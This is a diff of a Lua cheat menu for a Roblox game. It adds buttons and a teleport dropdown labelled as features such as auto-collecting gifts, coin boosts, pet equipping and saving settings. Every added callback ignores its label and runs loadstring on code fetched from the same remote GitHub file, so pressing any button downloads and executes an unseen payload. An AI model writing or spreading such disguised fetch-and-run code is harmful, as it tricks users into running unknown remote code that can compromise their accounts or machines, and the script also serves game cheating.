@@ -222,6 +222,119 @@ Player:AddButton({
   	end    
 })
 
+Player:AddButton({
+	Name = "Auto Collect Gifts",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+Player:AddButton({
+	Name = "Auto Instant Collect",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+Player:AddButton({
+	Name = "3x Coin Boost",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+Player:AddButton({
+	Name = "3x Coins Boost",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+Player:AddButton({
+	Name = "Auto Rank Rewards",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+Player:AddButton({
+	Name = "Auto Auto VIP Rewards",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+-- GUIs
+
+local GUIs = Window:MakeTab({
+	Name = "GUIs",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+GUIs:AddButton({
+	Name = "Upgrades",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+GUIs:AddButton({
+	Name = "Fuse Pets",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+GUIs:AddButton({
+	Name = "Golden Machine",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+GUIs:AddButton({
+	Name = "Rainbow Machine",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+GUIs:AddButton({
+	Name = "Collections",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+GUIs:AddButton({
+	Name = "Merchant Shop",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+GUIs:AddButton({
+	Name = "DarkMatter Machine",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+GUIs:AddButton({
+	Name = "Server Booster",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
+GUIs:AddButton({
+	Name = "Bank",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuthMAIL", true))()
+  	end    
+})
+
 -- Auto
 local Auto = Window:MakeTab({
 	Name = "Auto",
@@ -403,6 +516,64 @@ World:AddButton({
 
 World:AddButton({
 	Name = "Unlock All Gamepasses",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth", true))()
+  	end    
+})
+
+World:AddDropdown({
+	Name = "Teleport",
+	Default = "1",
+	Options = {"Shop", "Town", "Forest", "Beach", "Mine", "Winter", "Glacier", "Desert", "Volcano", "Cave", "Tech Entry", "Enchanted Forest", "Ancient Island", "Samurai Island", "Candy Island", "Haunted Island", "Hell Island", "Heaven Island", "Heaven's Gate", "Tech Shop", "Tech City", "Dark Tech", "Steampunk", "Alien Lab", "Steampunk Chest", "Alien Forest", "Glitch", "Giant Alien Chest", "Hacker Portal", "Axolotl Ocean", "Axolotl Deep Ocean", "Axolotl Cave", "Pixel Forest", "Pixel Kyoto", "Pixel Alps", "Pixel Vault", "Cat Paradise", "Cat Backyard", "Cat Taiga", "Cat Kingdom", "Wonderland", "Snowy Forest", "Elf Village", "North Pole"},
+	Callback = function(Value)
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth", true))()
+	end    
+})
+
+World:AddButton({
+	Name = "Normal Mode",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth", true))()
+  	end    
+})
+
+World:AddButton({
+	Name = "Rejoin",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth", true))()
+  	end    
+})
+
+World:AddButton({
+	Name = "Unequip All Pets",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth", true))()
+  	end    
+})
+
+World:AddButton({
+	Name = "Equip Best Pet",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth", true))()
+  	end    
+})
+
+World:AddButton({
+	Name = "Lag Reducer",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth", true))()
+  	end    
+})
+
+World:AddButton({
+	Name = "Stats Tracker",
+	Callback = function()
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth", true))()
+  	end    
+})
+
+World:AddButton({
+	Name = "Save Settings",
 	Callback = function()
       		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth", true))()
   	end    
